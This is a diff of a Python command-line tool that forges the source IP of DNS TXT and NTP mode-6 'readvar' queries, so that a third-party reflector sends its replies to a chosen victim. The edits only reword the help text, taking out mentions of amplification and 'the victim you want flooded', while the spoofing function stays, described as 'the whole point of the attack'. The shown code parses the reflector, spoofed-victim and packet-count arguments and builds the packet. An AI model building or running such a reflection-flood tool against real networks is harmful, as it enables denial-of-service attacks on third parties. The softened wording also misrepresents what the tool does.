@@ -3,22 +3,22 @@
 
 Usage: reflect <proto:dns|ntp> <reflector-ip> <spoofed-source-ip> [count] [qname]
 
-    proto              dns  -> a DNS TXT query (the reflector answers with an
-                              oversized TXT record)
+    proto              dns  -> a DNS TXT query (the reflector answers with the
+                              record it serves)
                        ntp  -> an NTP mode-6 "readvar" control query (the reflector
                               answers with its whole variable list)
     reflector-ip       the third party that will answer
     spoofed-source-ip  the address written into the packet's SOURCE field. The
-                       reflector sends its (larger) reply HERE, not to you. Set it
-                       to the victim you want flooded.
+                       reflector sends its reply HERE, not to you. Set it to the
+                       victim you want the reply delivered to.
     count              packets to send; 0 = until Ctrl-C (default 1)
-    qname              DNS only: the name to query (default amplify.lab)
+    qname              DNS only: the name to query (default reflect.lab)
 
 Nothing here is a magic button: you name the reflector, the protocol, and the
 source you are forging every time. The packet leaves with a source that is not
 yours, which is the whole point of the attack and exactly what source-address
-verification at the router is meant to stop. The reply's size versus the query's
-size is the amplification factor; measure it with tcpdump on the victim.
+verification at the router is meant to stop. Watch where the reply lands with
+tcpdump on the victim.
 """
 import random
 import sys
@@ -54,7 +54,7 @@ def main():
     reflector = sys.argv[2]
     spoofed = sys.argv[3]
     count = int(sys.argv[4]) if len(sys.argv) >= 5 else 1
-    qname = sys.argv[5] if len(sys.argv) == 6 else "amplify.lab"
+    qname = sys.argv[5] if len(sys.argv) == 6 else "reflect.lab"
 
     pkt = build(proto, reflector, spoofed, qname)
     reqlen = len(bytes(pkt))
